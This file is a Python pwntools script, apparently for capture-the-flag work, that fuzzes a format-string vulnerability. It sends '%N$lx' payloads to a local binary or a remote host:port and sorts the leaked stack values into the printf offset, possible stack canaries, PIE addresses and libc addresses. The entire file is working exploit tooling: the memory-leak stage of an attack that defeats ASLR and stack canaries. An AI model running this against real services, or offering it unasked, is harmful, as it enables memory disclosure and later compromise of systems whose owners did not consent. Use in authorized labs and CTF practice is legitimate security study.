# Fuzzer
from pwn import *
from termcolor import colored
import argparse


p = 0

# Create the parser
parser = argparse.ArgumentParser(
    description="Help Menu", epilog="Enjoy the program! :D")


parser.add_argument(
    "-remote", help="Activate remote server mode --> python3 fuzz.py -remote -ip 0.0.0.0 -port 9999 -cb /path/to/binary", action="store_true")

parser.add_argument(
    "-local", help="Activate local server mode --> python3 fuzz.py -local -cb /path/to/binary", action="store_true")


parser.add_argument(
    "-ip", help="IP address for the remote server (works with remote mode)")
parser.add_argument(
    "-port", help="Port for the remote server (works with remote mode)", type=int)


parser.add_argument(
    "-cb", help="Context Binary for pwntools (always set)", type=str)

parser.add_argument(
    "-num", help="Number of addresses to be printed", type=int, default=100)

args = parser.parse_args()

local = True

if args.remote:
    print("Remote server mode is activated.")
    p = remote(args.ip, args.port)
    local = False
elif args.local:
    print("Local server mode is activated.")
    # p = process(args.cb)


e = context.binary = ELF(args.cb)

context.log_level = 'warning'


def print_color(i, color):
    if i % 2 == 1:
        print(colored("{:<5} {:<30}".format(str(i)+':',
              str(result).replace('b', '').replace("'", '')), color))
    else:
        print(colored("{:<5} {:<30}".format(str(i)+':',
              str(result).replace('b', '').replace("'", '')), color), end='\t')


ofset_for_printf = 0
potential_canary = []
potential_libc = []
potential_pie = []
# Let's fuzz x values
for i in range(args.num):
    try:
        if (local):
            p = process(e.path)
        else:
            p = remote(args.ip, args.port)
        # Format the counter
        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
        # or use $s to show strings #change this
        p.sendlineafter('go?\n', 'AAAAAAAA.%{}$lx'.format(i).encode()) # change this
        # Receive the response
        p.recvuntil('hmm... ')  # change this
        result = p.recvline()
        result = result.split(b'is')[0].strip()  # change this

        # printf
        if ('41414141' in str(result)):
            ofset_for_printf = i
            print_color(i, "magenta")
            continue

        # pie
        if (str(result).split('.')[1][0] == '5' and (str(result).split('.')[1][1] == '5' or str(result).split('.')[1][1] == '6') and str(result)[-2] != '0'):
            potential_pie.append(i)
            print_color(i, "green")
            continue
        # libc
        if (str(result).split('.')[1][0] == '7' and str(result).split('.')[1][1] == 'f'):
            potential_libc.append(i)
            print_color(i, "blue")
            continue

        # canary
        if (str(result)[-2] == '0' and str(result)[-3] == '0' and str(result).split('.')[1][0] != '5 ' and i != ofset_for_printf and str(result).split('.')[1][0] != 'f' and str(result).split('.')[1][1] != 'f' and str(result).count('0') <= 4):
            potential_canary.append(i)
            print_color(i, "red")
            continue

        if i % 2 == 1:
            print("{:<5} {:<30}".format(str(i)+':',
                  str(result).replace('b', '').replace("'", '')))
        else:
            print("{:<5} {:<30}".format(str(i)+':',
                  str(result).replace('b', '').replace("'", '')), end='\t')

        p.close()

    except EOFError:
        pass


print("\n")

if (ofset_for_printf != 0):
    print("Offset for printf: ", ofset_for_printf,
          colored("-> PURPLE", "magenta"))

if (len(potential_canary) != 0):
    print("Potential canary: ", potential_canary, colored("-> RED", "red"))

if (len(potential_pie) != 0):
    print("Potential PIE: ", potential_pie, colored("-> GREEN", "green"))

if (len(potential_libc) != 0):
    print("Potential libc: ", potential_libc, colored("-> BLUE", "blue"))
